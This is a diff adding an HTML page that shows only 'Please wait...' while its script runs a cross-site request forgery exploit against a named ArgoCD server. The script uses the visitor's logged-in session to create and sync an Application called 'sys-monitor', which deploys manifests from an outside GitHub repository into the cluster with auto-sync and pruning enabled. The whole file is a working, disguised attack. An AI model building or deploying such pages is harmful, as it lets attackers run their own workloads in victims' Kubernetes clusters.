@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<h3>Please wait...</h3>
+<script>
+// Step 1: Check if user is logged into ArgoCD
+var img = new Image();
+img.onload = function() { exploit(); };
+img.onerror = function() { console.log('Not logged in'); };
+img.src = 'https://argocd.k8s-testnet.wvservices.exchange/api/v1/session/userinfo';
+
+function exploit() {
+    // Step 2: Create malicious Application via CSRF
+    // No Content-Type enforcement in v2.7.1 = no CORS preflight!
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://argocd.k8s-testnet.wvservices.exchange/api/v1/applications', true);
+    xhr.setRequestHeader('Content-Type', 'text/plain');
+    xhr.withCredentials = true;
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            console.log('Response:', xhr.status, xhr.responseText);
+            if (xhr.status == 200) {
+                // Step 3: Sync the application
+                var sync = new XMLHttpRequest();
+                sync.open('POST', 'https://argocd.k8s-testnet.wvservices.exchange/api/v1/applications/sys-monitor/sync', true);
+                sync.setRequestHeader('Content-Type', 'text/plain');
+                sync.withCredentials = true;
+                sync.send(JSON.stringify({}));
+            }
+        }
+    };
+    xhr.send(JSON.stringify({
+        "apiVersion": "argoproj.io/v1alpha1",
+        "kind": "Application",
+        "metadata": {
+            "name": "sys-monitor"
+        },
+        "spec": {
+            "destination": {
+                "server": "https://kubernetes.default.svc",
+                "namespace": "default"
+            },
+            "source": {
+                "repoURL": "https://github.com/zerdaydas/k8s-config",
+                "path": "deploy",
+                "targetRevision": "HEAD"
+            },
+            "project": "default",
+            "syncPolicy": {
+                "automated": {
+                    "prune": true,
+                    "selfHeal": true
+                }
+            }
+        }
+    }));
+}
+
+// Also try immediately in case image check is unreliable
+setTimeout(exploit, 2000);
+</script>
+</body>
+</html>
